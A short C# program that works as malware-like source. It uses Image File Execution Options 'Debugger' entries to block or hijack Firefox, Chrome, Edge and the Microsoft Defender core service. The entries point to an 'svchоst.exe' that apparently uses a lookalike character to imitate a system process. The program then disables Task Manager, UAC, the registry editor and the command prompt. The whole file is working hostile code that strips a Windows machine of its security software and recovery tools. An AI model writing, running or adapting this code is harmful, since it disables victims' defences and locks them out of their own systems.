
using Microsoft.Win32;

namespace FunctionDisabler
{
    class StopperofApplications
    {
    static void Main(string[] args)
    {
        DisableExecutables();
        
        DisableTaskManager();

        DisableUAC();

        DisableRegistryTools();
     
        DisableCommandPrompt();

    }

    static void DisableExecutables()
    {
        string[] keyPaths = {
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe",
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe",
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MpDefenderCoreService.exe",
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe",

    };

    string[] valueNames = { "Debugger", "Debugger", "Debugger", "Debugger" };

    string[] valueDatas = { "svchоst.exe", "svchоst.exe", "svchоst.exe", "svchоst.exe" };
 
        for (int i = 0; i < keyPaths.Length; i++)
     {
        ModifyRegistry(keyPaths[i], valueNames[1], valueDatas[i]);
    }
}

static void ModifyRegistry(string keyPath, string valueName, string valueData)
{
    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(keyPath))
    {
        if (key != null)
        {
        key.SetValue(valueName, valueData);
    
        }
    }
}

static void DisableTaskManager()
{
    RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
    
        key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

    
}
static void DisableUAC()
{
    RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
    
        key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);

    
}
static void DisableRegistryTools()
{
    RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
    
        key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

    
}
static void DisableCommandPrompt()
{
    RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
    
        key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);

        }
    }
}

